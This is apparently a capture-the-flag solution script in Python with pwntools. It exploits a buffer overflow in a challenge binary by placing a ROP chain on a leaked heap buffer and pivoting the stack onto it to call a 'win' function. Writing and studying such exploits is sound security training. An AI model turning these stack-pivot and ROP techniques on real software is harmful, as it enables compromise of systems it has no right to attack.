#!/usr/bin/env python3

from pwn import *

TARGET = './chall'
HOST = ''
PORT = 1337

elf = ELF(TARGET)

context.arch = 'amd64'
gdb_script = f"""
  # b *main
  b *main+126
  b *vuln+45
  c
"""
# context.log_level = 'DEBUG'

if args.GDB:
  context.terminal = ['wt.exe', '-w', '0', 'new-tab', '--', 'bash', '-lc']
  p = gdb.debug(TARGET, gdbscript=gdb_script)
elif not args.REMOTE:
  p = process(TARGET)
else:
  p = remote(HOST, PORT)

# ===================================== #

ret = 0x401197
pop_rdi = 0x401196
pop_rsi = 0x401198
pop_rdx = 0x40119a
pop_rax = 0x40118a
xchg_rsp_rax = 0x40118c

# Parse heap for Stack Pivot #
p.recvuntil(b'buffer at: ')
fake_stack = int(p.recvline()[:-1].strip(), 16)
print(f"Fake stack: {fake_stack:#x}")
# ========== #

# Prepare ROP chain on heap (fake stack) #
rop_payload = p64(ret) + p64(pop_rdi) + p64(0xdeadbeef) + p64(pop_rsi) + p64(0xcafebabe) + p64(pop_rdx) + p64(0x2badf00d) + p64(elf.sym.win)
p.sendafter(b'ROP chain: ', rop_payload)
# ========== #

# Stack Pivot to heap #
pivot_payload = p64(0x1337420) * 5 + p64(pop_rax) + p64(fake_stack) + p64(xchg_rsp_rax)
p.sendafter(b'Input: ', pivot_payload)
# ==========#

p.interactive()

# NOTE:
# Buffer Overflow
# Stack pivot
# Global variable overwrite
